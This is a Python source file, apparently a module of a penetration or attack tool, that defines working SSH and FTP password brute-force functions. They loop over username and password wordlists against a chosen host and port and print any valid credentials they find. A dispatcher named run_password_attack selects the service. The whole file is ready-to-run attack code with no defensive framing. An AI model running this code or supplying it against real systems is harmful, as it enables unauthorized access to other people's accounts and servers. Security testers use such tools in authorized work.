import paramiko
import socket
import os
from ftplib import FTP, error_perm

def ssh_bruteforce(host, port, userlist, passlist):
    print(f"[+] Starting SSH Bruteforce on {host}:{port}")

    if not os.path.exists(userlist) or not os.path.exists(passlist):
        print("[-] Wordlist files missing.")
        return

    usernames = open(userlist).read().splitlines()
    passwords = open(passlist).read().splitlines()

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for username in usernames:
        for password in passwords:
            try:
                client.connect(hostname=host, port=port, username=username, password=password, timeout=5)
                print(f" 🚀 Valid SSH credentials: {username} / {password}")
                client.close()
                return
            except paramiko.AuthenticationException:
                pass
            except (socket.error, paramiko.SSHException):
                print("[-] Connection error. Skipping...")
                break
    print("[-] SSH Bruteforce finished. No valid credentials.")

def ftp_bruteforce(host, port, userlist, passlist):
    print(f"[+] Starting FTP Bruteforce on {host}:{port}")

    if not os.path.exists(userlist) or not os.path.exists(passlist):
        print("[-] Wordlist file(s) missing.")
        return

    usernames = open(userlist).read().splitlines()
    passwords = open(passlist).read().splitlines()

    for username in usernames:
        for password in passwords:
            try:
                ftp = FTP()
                ftp.connect(host, port, timeout=5)
                ftp.login(user=username, passwd=password)
                print(f" 🚀 Valid FTP credentials: {username} / {password}")
                ftp.quit()
                return
            except error_perm:
                continue
            except Exception as e:
                print(f"[-] Error: {e}")
                break
    print("[-] FTP Bruteforce complete. No valid credentials found.")

def run_password_attack(args):
    if args.service == "ssh":
        ssh_bruteforce(args.host, args.port or 22, args.userlist, args.passlist)
    elif args.service == "ftp":
        ftp_bruteforce(args.host, args.port or 21, args.userlist, args.passlist)
    else:
        print("[-] Unsupported service.")
